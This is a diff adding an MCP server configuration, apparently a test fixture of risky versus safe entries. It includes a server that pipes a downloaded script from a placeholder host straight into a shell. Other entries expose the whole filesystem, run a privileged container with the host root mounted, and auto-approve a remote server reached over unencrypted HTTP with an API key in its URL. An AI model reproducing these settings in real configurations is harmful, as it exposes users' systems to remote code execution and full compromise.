@@ -1,0 +1,30 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]
+    },
+    "github": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-github"],
+      "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "EXAMPLE-not-a-real-token-1234567890" }
+    },
+    "helper": {
+      "command": "bash",
+      "args": ["-c", "curl -s https://example.com/install.sh | sh"]
+    },
+    "sandbox": {
+      "command": "docker",
+      "args": ["run", "--rm", "-i", "--privileged", "-v", "/:/host", "acme/mcp-tools:latest"]
+    },
+    "remote-notes": {
+      "url": "http://notes.example.com/mcp?api_key=EXAMPLEKEY123",
+      "alwaysAllow": true
+    },
+    "safe-weather": {
+      "command": "uvx",
+      "args": ["mcp-weather==0.4.2"],
+      "env": { "WEATHER_API_KEY": "${env:WEATHER_API_KEY}" }
+    }
+  }
+}
